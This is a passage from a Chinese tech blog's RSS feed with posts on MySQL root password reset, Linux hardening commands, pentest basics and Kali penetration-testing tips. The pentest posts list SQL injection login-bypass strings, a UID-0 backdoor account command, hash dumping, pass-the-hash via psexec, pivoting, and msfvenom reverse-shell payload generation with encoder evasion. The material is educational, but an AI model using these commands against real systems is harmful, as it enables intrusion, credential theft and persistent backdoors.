      <span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>text<span>"</span></span> <span>ng-model</span><span><span>=</span><span>"</span>message<span>"</span></span> <span>/></span></span>
      <span><span><span>&lt;</span>h1</span><span>></span></span>{{ message }}<span><span><span>&lt;/</span>h1</span><span>></span></span>
    <span><span><span>&lt;/</span>div</span><span>></span></span>

    <span><span><span>&lt;</span>script</span> <span>src</span><span><span>=</span><span>"</span>https://cdn.bootcss.com/angular.js/1.7.8/angular.min.js<span>"</span></span><span>></span></span><span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
    <span><span><span>&lt;</span>script</span><span>></span></span><span><span>
      <span>// 这边使用到的是推断型依赖注入</span>
      <span>const</span> MyModule <span>=</span> angular<span>.</span><span>module</span><span>(</span><span>"MyModule"</span><span>,</span> <span>[</span><span>]</span><span>)</span><span>;</span>

      <span>const</span> <span>MyCtrl</span> <span>=</span> <span>function</span> <span>(</span><span>$scope</span><span>)</span> <span>{</span>
        $scope<span>.</span>message <span>=</span> <span>"Hello world !!!"</span><span>;</span>
      <span>}</span><span>;</span>

      MyModule<span>.</span><span>controller</span><span>(</span><span>"MyCtrl"</span><span>,</span> MyCtrl<span>)</span><span>;</span>
    </span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
  <span><span><span>&lt;/</span>body</span><span>></span></span>
<span><span><span>&lt;/</span>html</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>更新 MySQL root 的密码</title>
      <link>https://vxhly.github.io/views/other/update-mysql-root-password.html</link>
      <guid>https://vxhly.github.io/views/other/update-mysql-root-password.html</guid>
      <source url="https://vxhly.github.io/rss.xml">更新 MySQL root 的密码</source>
      <description>前言
最近在 ubuntu 系统上安装了 MySQL, 但是安装时没有提示输入 root 用户密码, 网上胡乱找了一通, 这才知道 MySQL 5.7 以上版本的 root 密码都是随机生成的, 所以这里提供解决 MySQL 5.7 版本的 root 用户重置密码问题。

</description>
      <category>other</category>
      <pubDate>Thu, 06 Sep 2018 19:19:17 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>最近在 ubuntu 系统上安装了 MySQL, 但是安装时没有提示输入 root 用户密码, 网上胡乱找了一通, 这才知道 MySQL 5.7 以上版本的 root 密码都是随机生成的, 所以这里提供解决 MySQL 5.7 版本的 root 用户重置密码问题。</p>
</div>

<h2 id="安装-mysql" tabindex="-1"> 安装 MySQL</h2>
<div><pre><code><span>apt-get</span> <span>install</span> mysql-cilent mysql-server 解决MySQL <span>5.7</span>版本的root用户重置密码问题
</code></pre><div aria-hidden="true"><div></div></div></div><p>安装之后可以使用下面的命令来检查是否安装成功</p>
<div><pre><code><span>sudo</span> <span>netstat</span> -tap <span>|</span> <span>grep</span> mysql
<span>netstat</span> -tap <span>|</span> <span>grep</span> mysql
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="登录-mysql" tabindex="-1"> 登录 MySQL</h2>
<div><pre><code>mysql -u root -p
</code></pre><div aria-hidden="true"><div></div></div></div><p>输入密码, 如果可以进入则下面的不用看了；如果提示不能登入, 则我们尝试启用安全模式登入 MySQL, 这样可以绕过密码登入, 登入后再修改密码。</p>
<h2 id="修改密码" tabindex="-1"> 修改密码</h2>
<h3 id="修改配置文件" tabindex="-1"> 修改配置文件</h3>
<p><code>my.cnf</code> =&gt; 不同系统的配置文件名以及存放路径不一致, 但一定能在 <code>/etc/mysql</code> 里找到</p>
<p>在 [mysqld] 小节下添加一行, 这一行配置让 mysqld 启动时不对密码进行验证</p>
<div><pre><code>[mysqld]
skip - grant - tables = 1
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>修改完成之后保存重启 MySQL 服务</p>
<div><pre><code>/etc/init.d/mysql restart
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="无密码登录-mysql-修改密码" tabindex="-1"> 无密码登录 MySQL 修改密码</h3>
<div><pre><code>mysql -u root -p
</code></pre><div aria-hidden="true"><div></div></div></div><p>执行以下操作</p>
<div><pre><code>mysql<span>></span> use mysql<span>;</span>
 mysql<span>></span> update user <span>set</span> <span>authentication_string</span><span>=</span>PASSWORD<span>(</span><span>"这里输入你要改的密码"</span><span>)</span> where <span>User</span><span>=</span><span>'root'</span><span>;</span><span>#更改密码</span>
 mysql<span>></span> update user <span>set</span> <span>plugin</span><span>=</span><span>"mysql_native_password"</span><span>;</span><span>#如果没这一行可能也会报一个错误,因此需要运行这一行</span>
 mysql<span>></span> flush privileges<span>;</span><span>#更新所有操作权限</span>
 mysql<span>></span> quit
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="完成配置重启" tabindex="-1"> 完成配置重启</h3>
<p>删掉或者注释 <code>skip-grant-tables=1</code> 该行配置</p>
<p>修改完成之后保存重启 MySQL 服务</p>
<div><pre><code>/etc/init.d/mysql restart
</code></pre><div aria-hidden="true"><div></div></div></div><p>之后使用设置的密码登录即可</p>
<div><pre><code>mysql -u root -p
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="附上完全卸载-mysql-命令" tabindex="-1"> 附上完全卸载 MySQL 命令</h2>
<div><pre><code><span>apt-get</span> autoremove mysql-*
 dpkg -l <span>|</span><span>grep</span> ^rc<span>|</span><span>awk</span> <span>'{print $2}'</span> <span>|</span><span>sudo</span> <span>xargs</span> dpkg -P
</code></pre><div aria-hidden="true"><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Liunx 安全加固命令集合</title>
      <link>https://vxhly.github.io/views/pentest/liunx-security-command.html</link>
      <guid>https://vxhly.github.io/views/pentest/liunx-security-command.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Liunx 安全加固命令集合</source>
      <description>前言
收集 Liunx 系统安全加固时, 发现系统漏洞, 修复系统, 加固系统信息等命令集合。

</description>
      <category>pentest</category>
      <pubDate>Sat, 20 May 2017 14:22:42 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>收集 Liunx 系统安全加固时, 发现系统漏洞, 修复系统, 加固系统信息等命令集合。</p>
</div>

<h2 id="find" tabindex="-1"> find</h2>
<div><pre><code><span># 使用 uid 查找对应的程序</span>
<span>find</span> / -uid <span>0</span> -perm -4000

<span># 查找哪里拥有写权限</span>
<span>find</span> / -perm -o<span>=</span>w

<span># 查找名称中包含点和空格的文件</span>
<span>find</span> / -name <span>" "</span> -print
<span>find</span> / -name <span>".."</span> -print
<span>find</span> / -name <span>". "</span> -print
<span>find</span> / -name <span>" "</span> -print

<span># 查找不属于任何人的文件</span>
<span>find</span> / -nouser

<span># 查找那些文件包含指定文本内容</span>
<span>find</span> / -iname <span>"*"</span> <span>|</span> xrags <span>grep</span> <span>"[String]"</span>

<span># 查找一小时内新增的文件</span>
<span>find</span> / -cmin -60

<span># 查找所有不可修改的文件</span>
<span>find</span> <span>.</span> <span>|</span> <span>xargs</span> -I <span>file</span> lsattr -a <span>file</span> <span><span>2</span>></span>/dev/null <span>|</span> <span>grep</span> ‘^….i’

<span># 查找 SUID root 文件</span>
<span>find</span> / -user root -perm -4000 -print

<span># 查找 SGID root 文件:</span>
<span>find</span> / -group root -perm -2000 -print

<span># 查找 SUID 和 SGID 文件:</span>
<span>find</span> / -perm -4000 -o -perm -2000 -print

<span># 查找不属于任何用户的文件:</span>
<span>find</span> / -nouser -print

<span># 查找不属于任何用户组的文件:</span>
<span>find</span> / -nogroup -print

<span># 查找软连接及其指向:</span>
<span>find</span> / -type l -ls
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="lsof" tabindex="-1"> lsof</h2>
<div><pre><code><span># 查找未链接的文件</span>
<span>lsof</span> +L1

<span># 获取进程打开端口的信息</span>
<span>lsof</span> -i
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="arp" tabindex="-1"> arp</h2>
<div><pre><code><span># 看看 ARP 表中是否有奇怪的东西</span>
arp -a
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="getent" tabindex="-1"> getent</h2>
<div><pre><code><span># 查看所有账户</span>
getent <span>passwd</span>

<span># 查看所有用户组</span>
getent group
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="chattr" tabindex="-1"> chattr</h2>
<div><pre><code><span># 使文件不可修改</span>
chattr -i fileKK
</code></pre><div aria-hidden="true"><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>渗透基础知识</title>
      <link>https://vxhly.github.io/views/pentest/pentest-basic-knowledge.html</link>
      <guid>https://vxhly.github.io/views/pentest/pentest-basic-knowledge.html</guid>
      <source url="https://vxhly.github.io/rss.xml">渗透基础知识</source>
      <description>前言
整理的渗透所需的一些基础知识。

</description>
      <category>pentest</category>
      <pubDate>Sun, 03 Sep 2017 19:54:18 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>整理的渗透所需的一些基础知识。</p>
</div>

<h2 id="html-表单基础" tabindex="-1"> HTML 表单基础</h2>
<ol>
<li>该表单是提交给哪个文件进行处理的（查看 action 属性值）</li>
<li>向后端程序提交的参数是什么（查看 name 属性）</li>
</ol>
<h2 id="sql-数据库查询语句基础" tabindex="-1"> SQL 数据库查询语句基础</h2>
<ol>
<li>查询返回所有的结果</li>
</ol>
<div><pre><code><span>select</span> <span>*</span> <span>from</span> users<span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="2">
<li>条件查询</li>
</ol>
<div><pre><code><span>select</span> <span>*</span> <span>from</span> users <span>where</span> uame<span>=</span><span>'$uname'</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="3">
<li>union 合并多个查询结果</li>
</ol>
<div><pre><code><span>select</span> <span>*</span> <span>from</span> users <span>union</span> <span>select</span> <span>*</span> <span>from</span> msgs<span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol>
<li>... ...</li>
</ol>
<h2 id="万能用户名或者万能密码" tabindex="-1"> 万能用户名或者万能密码</h2>
<ol>
<li>第一种</li>
</ol>
<div><pre><code><span>select</span> <span>*</span> <span>from</span> users <span>where</span> uame<span>=</span><span>''</span> <span>or</span> <span>''</span><span>=</span><span>''</span> <span>and</span> passwd<span>=</span>$passwd<span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="2">
<li>第二种</li>
</ol>
<div><pre><code><span>select</span> _from users <span>where</span> uame<span>=</span><span>''</span> <span>union</span> select_ <span>from</span> users <span>and</span> passwd<span>=</span>$passwd<span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="3">
<li>第三种</li>
</ol>
<div><pre><code><span>select</span> <span>*</span> <span>from</span> users <span>where</span> uame<span>=</span>$uname <span>and</span> passwd<span>=</span><span>''</span> <span>or</span> <span>''</span><span>=</span><span>''</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="4">
<li>... ...</li>
</ol>
<h2 id="使用-pdo-进行防注入基础" tabindex="-1"> 使用 PDO 进行防注入基础</h2>
<ol>
<li>允许长连接</li>
</ol>
<div><pre><code><span>PDO</span><span>::</span><span>ATTR_PERSISTENT</span><span>=></span><span>true</span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="2">
<li>不允许使用预处理语句</li>
</ol>
<div><pre><code><span>PDO</span><span>::</span><span>ATTR_EMULATE_PREPARE</span><span>=></span><span>false</span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="3">
<li>PDO 连接</li>
</ol>
<div><pre><code><span>$pdh</span><span>=</span><span>new</span> <span>PDO</span><span>(</span>host<span>=</span><span>'127.0.0.1:1433'</span><span>,</span>user<span>=</span><span>'sa'</span><span>,</span>password<span>=</span><span>'root'</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="4">
<li>预处理 SQL 查询语句</li>
</ol>
<div><pre><code><span>$stmt</span><span>=</span><span>$dbh</span><span>-></span><span>prepare</span><span>(</span><span>$sql</span><span>)</span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="5">
<li>填充 SQL 语句中的占位符</li>
</ol>
<div><pre><code><span>$stmt</span><span>-></span><span>execute</span><span>(</span><span>array</span><span>(</span><span>...</span><span>,</span><span>...</span><span>,</span><span>...</span><span>.</span><span>)</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="6">
<li>SQL 占位符（如: select * from users where uname=? and passwd=?; ）</li>
</ol>
<div><pre><code><span>select</span> <span>*</span> <span>from</span> users <span>where</span> uname<span>=</span>? <span>and</span> passwd<span>=</span>?<span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="7">
<li>... ...</li>
</ol>
<h2 id="wireshark-抓包" tabindex="-1"> Wireshark 抓包</h2>
<ol>
<li>熟练使用 <strong>Wireshark</strong> 这款软件</li>
<li>熟练掌握过滤器的写法（如: <code>tcp</code> 、 <code>udp</code> 、 <code>icmp</code> 、 <code>mac</code> ......）</li>
<li>知道各个协议的包结构、包头、包尾</li>
<li>... ...</li>
</ol>
<h2 id="审查代码的能力" tabindex="-1"> 审查代码的能力</h2>
<ol>
<li><strong>HTML</strong> 源文件内容（通过右键网页 –&gt; 查看源文件）</li>
<li><strong>PHP</strong> 代码（了解代码逻辑以及书写规范, 特别是对函数名的记忆）</li>
<li><strong>PYTHON</strong> 代码（快速读懂代码意思, 特别是要从 main 函数入手去查看）</li>
<li><strong>C</strong> 语言代码（从代码中分析出来, 该代码的意思以及各个函数的逻辑）</li>
<li>... ...</li>
</ol>
<h2 id="各个-web-漏洞的利用能力" tabindex="-1"> 各个 WEB 漏洞的利用能力</h2>
<ol>
<li><strong>SQL</strong> 注入（通过万能用户名和万能密码来获取一定的 webshell）</li>
<li>命令注入（特别是 PHP 中的 exec 和 system 函数也能获取到一定的 webshell）</li>
<li>文件包含和目录遍历（通过 <code>../../../../... .../flag.txt</code> 来获取文件）</li>
<li>... ...</li>
</ol>
<h2 id="liunx-服务的安全配置" tabindex="-1"> Liunx 服务的安全配置</h2>
<ol>
<li><strong>SSH</strong>（禁止 root 登录；禁止空密码登录；禁止密钥登录 ... ...）</li>
<li><strong>TELNET</strong>（禁止 root telnet；禁用 telnet ... ...）</li>
<li><strong>VSFTP</strong>（不允许普通用户登录 ftp；禁止匿名用户登录 ftp ... ...）</li>
<li><strong>HTTPD</strong>（禁止回显 banner 信息；严格控制目录权限 ... ...）</li>
<li>... ...</li>
</ol>
<h2 id="php-安全配置" tabindex="-1"> PHP 安全配置</h2>
<ol>
<li>开启安全模式</li>
</ol>
<div><pre><code>safe_mode <span>=</span> on
</code></pre><div aria-hidden="true"><div></div></div></div><ol>
<li>禁用函数</li>
</ol>
<div><pre><code>disable_functions <span>=</span> system,exec,eval,shell_exec,phpinfo,<span>..</span>. <span>..</span>.
</code></pre><div aria-hidden="true"><div></div></div></div><ol>
<li>禁止 SQL 注入</li>
</ol>
<div><pre><code>magic_quotes_gpc <span>=</span> On
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="python-渗透脚本基础" tabindex="-1"> PYTHON 渗透脚本基础</h2>
<ol>
<li>了解 scapy 这一模块（特别是在构造数据包的时候该怎么写）</li>
<li>了解 dpkt 封装或者拆解网络协议包</li>
<li>了解 socket 编程</li>
<li>能够从 help 这一帮助函数中获取到其他函数的使用方法</li>
<li>拥有快速阅读脚本的能力和代码逻辑思维</li>
<li>... ...</li>
</ol>
<h2 id="liunx-常用命令" tabindex="-1"> Liunx 常用命令</h2>
<ol>
<li><strong>find</strong></li>
</ol>
<div><pre><code><span>find</span>  /  -iname  * <span>|</span> <span>xargs</span>  <span>grep</span>  –i  <span>'*key*'</span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="2">
<li>grep</li>
</ol>
<div><pre><code><span>grep</span>  <span>'*key*'</span>  ./keystring.txt
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="3">
<li>netstat</li>
</ol>
<div><pre><code><span>netstat</span> –tulnp <span>11.4</span> <span>kill</span> -9 <span>[</span>pid<span>]</span> <span>11.5</span> chattr +i /etc/passwd
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="4">
<li>kill</li>
</ol>
<div><pre><code><span>kill</span> -9 <span>[</span>pid<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="5">
<li>chattr</li>
</ol>
<div><pre><code>chattr  +i  /etc/passwd /etc/shadow
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="6">
<li>useradd</li>
</ol>
<div><pre><code><span>useradd</span>  -o  -u  <span>0</span>  <span>test</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="web-漏洞训练平台" tabindex="-1"> WEB 漏洞训练平台</h2>
<p>1.<strong>DVWA</strong> 【<a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener noreferrer">DVWA</a>】 2.<strong>Web For Pentester</strong> 【<a href="https://pentesterlab.com/exercises/web_for_pentester_II" target="_blank" rel="noopener noreferrer">Web For Pentester II</a>】(请自行安装镜像, 安装时请选择&quot;其他 Liunx 3.x 内核 64 位&quot;) 3.<strong>ZVulDrill</strong> 【<a href="https://github.com/710leo/ZVulDrill" target="_blank" rel="noopener noreferrer">ZVulDrill</a>】(请自行准备 PHP 环境)</p>
<ol start="4">
<li>... ...</li>
</ol>
<h2 id="网络协议原理" tabindex="-1"> 网络协议原理</h2>
<ol>
<li><strong>Tcp</strong> 三次握手和四次挥手</li>
<li><strong>Icmp</strong> 发包以及回包</li>
<li><strong>Mac</strong> 防洪原理</li>
<li><strong>ARP</strong> 发广播包, <strong>ARP</strong> 欺骗</li>
<li><strong>Dtp</strong> 生成树攻击原理</li>
<li>... ...</li>
</ol>
<h2 id="关于-python-的网络渗透编程" tabindex="-1"> 关于 PYTHON 的网络渗透编程</h2>
<ol>
<li>ARP 扫描</li>
</ol>
<div><pre><code><span>import</span> socket
<span># or</span>
<span>from</span> scapy<span>.</span><span>all</span> <span>import</span> <span>*</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><ol start="2">
<li>ARP 欺骗、ARP 监控</li>
</ol>
<div><pre><code><span>from</span> scapy<span>.</span><span>all</span> <span>import</span> <span>*</span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="3">
<li>OS 扫描</li>
</ol>
<div><pre><code><span>import</span> nmap
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="4">
<li>Mac 防洪</li>
</ol>
<div><pre><code><span>import</span> socket
<span># or</span>
<span>from</span> scapy<span>.</span><span>all</span> <span>import</span> <span>*</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><ol start="5">
<li>mssql 数据库密码爆破</li>
</ol>
<div><pre><code><span>import</span> pymssql
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="6">
<li>跨越 VlAN 攻击</li>
</ol>
<div><pre><code><span>from</span> scapy<span>.</span><span>all</span> <span>import</span> <span>*</span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="7">
<li>Dtp 攻击</li>
</ol>
<div><pre><code><span>from</span> scapy<span>.</span><span>all</span> <span>import</span> <span>*</span>
</code></pre><div aria-hidden="true"><div></div></div></div><ol start="8">
<li>... ...</li>
</ol>
]]></content:encoded>
    </item>
    <item>
      <title>kali 下渗透测试的一些小技巧</title>
      <link>https://vxhly.github.io/views/pentest/pentest-tips-and-tricks.html</link>
      <guid>https://vxhly.github.io/views/pentest/pentest-tips-and-tricks.html</guid>
      <source url="https://vxhly.github.io/rss.xml">kali 下渗透测试的一些小技巧</source>
      <description>前言
总结在渗透测试上的一些小技巧, 基本上都是 kali 下的一些常用的工具使用集合。

</description>
      <category>pentest</category>
      <pubDate>Sat, 20 May 2017 13:23:12 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>总结在渗透测试上的一些小技巧, 基本上都是 kali 下的一些常用的工具使用集合。</p>
</div>

<h2 id="dirb" tabindex="-1"> DIRB</h2>
<h3 id="使用-dirb-爆破目录" tabindex="-1"> 使用 DIRB 爆破目录</h3>
<p>注: <a href="http://dirb.sourceforge.net/" target="_blank" rel="noopener noreferrer">DIRB</a> 是一个专门用于爆破目录的工具, 在 Kali 中默认已经安装, 类似工具还有国外的 <a href="http://github.com/lanjelot/patator" target="_blank" rel="noopener noreferrer">patator</a>, <a href="http://github.com/maurosoria/dirsearch" target="_blank" rel="noopener noreferrer">dirsearch</a>, [DirBuster](http://www.owasp.org/index.php/Category: OWASP_DirBuster_Project), 国内的御剑等等。</p>
<div><pre><code>dirb http://<span>[</span>IP<span>]</span>:PORT /usr/share/dirb/wordlists/common.txt
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="niko" tabindex="-1"> Niko</h2>
<h3 id="使用-nikto-扫描-web-服务" tabindex="-1"> 使用 Nikto 扫描 Web 服务</h3>
<div><pre><code>nikto -C all -h http://<span>[</span>IP<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="wpscan" tabindex="-1"> wpscan</h2>
<h3 id="使用-wpscan-扫描-wordpress" tabindex="-1"> 使用 wpscan 扫描 WordPress</h3>
<div><pre><code><span>git</span> clone https://github.com/wpscanteam/wpscan.git <span>&amp;&amp;</span> <span>cd</span> wpscan
./wpscan –url <span>&lt;</span>http:http://<span>[</span>IP<span>]</span>/<span>></span> –enumerate p
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="httprint" tabindex="-1"> httprint</h2>
<h3 id="使用-httprint-进行-http-指纹识别" tabindex="-1"> 使用 httprint 进行 HTTP 指纹识别</h3>
<div><pre><code><span>wget</span> //www.net-square.com/_assets/httprint_linux_301.zip <span>&amp;&amp;</span> <span>unzip</span> httprint_linux_301.zip
<span>cd</span> httprint_301/linux/
./httprint -h http://<span>[</span>IP<span>]</span> -s signatures.txt
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="skipfish" tabindex="-1"> Skipfish</h2>
<h3 id="使用-skipfish-进行-web-应用安全" tabindex="-1"> 使用 Skipfish 进行 Web 应用安全</h3>
<p>注: Skipfish 是一款 Web 应用安全侦查工具, Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图, 最终生成的地图会在通过安全检查后输出。</p>
<div><pre><code>skipfish -m <span>5</span> -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://<span>[</span>IP<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="nc" tabindex="-1"> nc</h2>
<h3 id="使用-nc-进行扫描" tabindex="-1"> 使用 nc 进行扫描</h3>
<div><pre><code><span>nc</span> -v -w <span>1</span> target -z <span>1</span>-1000
<span>for</span> <span>i</span> <span>in</span> <span>{</span><span>101</span><span>..</span><span>102</span><span>}</span><span>;</span><span>do</span> <span>nc</span> -vv -n -w <span>1</span> <span>192.168</span>.56.<span>$i</span> <span>21</span>-25 -z<span>;</span><span>done</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="us" tabindex="-1"> us</h2>
<h3 id="使用-unicornscan-进行信息收集和安全审计" tabindex="-1"> 使用 Unicornscan 进行信息收集和安全审计</h3>
<div><pre><code>us -H -msf -Iv <span>192.168</span>.56.101 -p <span>1</span>-65535
us -H -mU -Iv <span>192.168</span>.56.101 -p <span>1</span>-65535

<span># -H 在生成报告阶段解析主机名</span>
<span># -m 扫描类型 (sf - tcp, U - udp)</span>
<span># -Iv - 详细</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="xprobe2" tabindex="-1"> Xprobe2</h2>
<h3 id="使用-xprobe2-识别操作系统指纹" tabindex="-1"> 使用 Xprobe2 识别操作系统指纹</h3>
<div><pre><code>xprobe2 -v -p tcp:80:open IP
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="meterpreter" tabindex="-1"> Meterpreter</h2>
<h3 id="使用-meterpreter-进行端口转发" tabindex="-1"> 使用 Meterpreter 进行端口转发</h3>
<div><pre><code><span># //www.offensive-security.com/metasploit-unleashed/portfwd/</span>
<span># 转发远程端口到目标地址</span>

meterpreter <span>></span> portfwd <span>add</span> –l <span>3389</span> –p <span>3389</span> –r <span>172.16</span>.194.141
kali <span>></span> rdesktop <span>127.0</span>.0.1:3389
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="使用-meterpreter-获取哈希值" tabindex="-1"> 使用 Meterpreter 获取哈希值</h3>
<div><pre><code><span>git</span> clone https://github.com/byt3bl33d3r/pth-toolkit
pth-winexe -U <span>hash</span> http://<span>[</span>IP<span>]</span> cmd

<span># 或者</span>

<span>apt-get</span> <span>install</span> freerdp-x11
xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP

<span># 在或者</span>

meterpreter <span>></span> run post/windows/gather/hashdump
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
msf <span>></span> use exploit/windows/smb/psexec
msf exploit<span>(</span>psexec<span>)</span> <span>></span> <span>set</span> payload windows/meterpreter/reverse_tcp
msf exploit<span>(</span>psexec<span>)</span> <span>></span> <span>set</span> SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
msf exploit<span>(</span>psexec<span>)</span> <span>></span> exploit
meterpreter <span>></span> shell
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="使用-hashcat-破解密码" tabindex="-1"> 使用 Hashcat 破解密码</h4>
<div><pre><code>hashcat -m <span>400</span> -a <span>0</span> <span>hash</span> /root/rockyou.txt
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="使用-metasploit-进行穿透" tabindex="-1"> 使用 metasploit 进行穿透</h3>
<div><pre><code>route <span>add</span> X.X.X.X <span>255.255</span>.255.0 <span>1</span>
use auxiliary/server/socks4a
run
proxychains msfcli windows/* <span>PAYLOAD</span><span>=</span>windows/meterpreter/reverse_tcp <span>LHOST</span><span>=</span>IP <span>LPORT</span><span>=</span><span>443</span> <span>RHOST</span><span>=</span>IP E

<span>#或者</span>

<span># //www.offensive-security.com/metasploit-unleashed/pivoting/</span>
meterpreter <span>></span> ipconfig
IP Address  <span>:</span> <span>10.1</span>.13.3
meterpreter <span>></span> run autoroute -s <span>10.1</span>.13.0/24
meterpreter <span>></span> run autoroute -p
<span>10.1</span>.13.0          <span>255.255</span>.255.0      Session <span>1</span>
meterpreter <span>></span> Ctrl+Z
msf auxiliary<span>(</span>tcp<span>)</span> <span>></span> use exploit/windows/smb/psexec
msf exploit<span>(</span>psexec<span>)</span> <span>></span> <span>set</span> RHOST <span>10.1</span>.13.2
msf exploit<span>(</span>psexec<span>)</span> <span>></span> exploit
meterpreter <span>></span> ipconfig
IP Address  <span>:</span> <span>10.1</span>.13.2
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="ssh" tabindex="-1"> ssh</h2>
<h3 id="ssh-穿透" tabindex="-1"> SSH 穿透</h3>
<div><pre><code><span>ssh</span> -D <span>127.0</span>.0.1:1080 -p <span>22</span> user@IP
Add socks4 <span>127.0</span>.0.1 <span>1080</span> <span>in</span> /etc/proxychains.conf
proxychains commands target
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="ssh-穿透从一个网络到另一个网络" tabindex="-1"> SSH 穿透从一个网络到另一个网络</h3>
<div><pre><code><span>ssh</span> -D <span>127.0</span>.0.1:1080 -p <span>22</span> user1@IP1
Add socks4 <span>127.0</span>.0.1 <span>1080</span> <span>in</span> /etc/proxychains.conf
proxychains <span>ssh</span> -D <span>127.0</span>.0.1:1081 -p <span>22</span> user1@IP2
Add socks4 <span>127.0</span>.0.1 <span>1081</span> <span>in</span> /etc/proxychains.conf
proxychains commands target
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="msfvenom" tabindex="-1"> msfvenom</h2>
<h3 id="msf-payloads" tabindex="-1"> MSF Payloads</h3>
<div><pre><code>msfvenom -p windows/meterpreter/reverse_tcp <span>LHOST</span><span>=</span><span>&lt;</span>IP Address<span>></span> X <span>></span> system.exe
msfvenom -p php/meterpreter/reverse_tcp <span>LHOST</span><span>=</span><span>&lt;</span>IP Address<span>></span> <span>LPORT</span><span>=</span><span>443</span> R <span>></span> exploit.php
msfvenom -p windows/meterpreter/reverse_tcp <span>LHOST</span><span>=</span><span>&lt;</span>IP Address<span>></span> <span>LPORT</span><span>=</span><span>443</span> -e -a x86 --platform win -f asp -o file.asp
msfvenom -p windows/meterpreter/reverse_tcp <span>LHOST</span><span>=</span><span>&lt;</span>IP Address<span>></span> <span>LPORT</span><span>=</span><span>443</span> -e x86/shikata_ga_nai -b <span>"<span title="\x00">\x00</span>"</span> -a x86 --platform win -f c
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h3 id="msf-生成在-linux-下反弹的-meterpreter-shell" tabindex="-1"> MSF 生成在 Linux 下反弹的 Meterpreter Shell</h3>
